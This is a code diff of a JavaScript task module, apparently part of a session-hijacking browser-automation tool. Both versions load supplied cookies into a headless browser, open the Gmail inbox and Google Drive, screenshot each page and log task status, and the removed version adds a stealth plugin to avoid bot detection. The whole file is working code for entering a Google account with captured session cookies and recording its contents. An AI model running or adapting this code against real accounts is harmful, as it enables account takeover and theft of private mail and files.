@@ -1,27 +1,19 @@
-const puppeteer = require('puppeteer-extra')
-const StealthPlugin = require('puppeteer-extra-plugin-stealth')
-const necrohelp = require('../../tasks/helpers/necrohelp')
-const db = require('../../db/db')
+'use strict';
 
-exports.ScreenshotApps = async ({page, data: [taskId, cookies, params]}) => {
-    // update initial task status from queued to running
-    await db.UpdateTaskStatus(taskId, "running")
+const necrohelp = require('../helpers/necrohelp');
+const db = require('../../db/db');
 
-    await necrohelp.SetCookies(page, cookies, {url: 'https://mail.google.com/'});
-    await necrohelp.ConfigureUserAgent(page, params.userAgent, taskId);
-
-    await page.goto('https://mail.google.com/mail/u/0/#inbox');
-    //await necrohelp.ScreenshotCurrentPage(page, taskId)
-    await necrohelp.Sleep(2000)
-    await necrohelp.ScreenshotCurrentPage(page, taskId)
-
-    await page.click('a[aria-label="Google apps"]').catch(console.error)
-    console.log('clicking apps waffle')
-    await necrohelp.Sleep(2000)
-
-    await page.goto('https://drive.google.com/drive/my-drive')
-    await necrohelp.Sleep(2000)
-    await necrohelp.ScreenshotCurrentPage(page, taskId)
-
-    await db.UpdateTaskStatus(taskId, "completed")
-}
+exports.ScreenshotApps = async ({ page, data: [taskId, cookies, params] }) => {
+    await necrohelp.runTask(db, taskId, async () => {
+        await necrohelp.SetCookieJar(page, cookies);
+        await necrohelp.ConfigureUserAgent(page, params?.userAgent, taskId);
+        await necrohelp.timedGoto(page, 'https://mail.google.com/mail/u/0/#inbox');
+        await necrohelp.Sleep(2000);
+        await necrohelp.ScreenshotCurrentPage(page, taskId);
+        await page.click('a[aria-label="Google apps"]');
+        await necrohelp.Sleep(2000);
+        await necrohelp.timedGoto(page, 'https://drive.google.com/drive/my-drive');
+        await necrohelp.Sleep(2000);
+        await necrohelp.ScreenshotCurrentPage(page, taskId);
+    });
+};
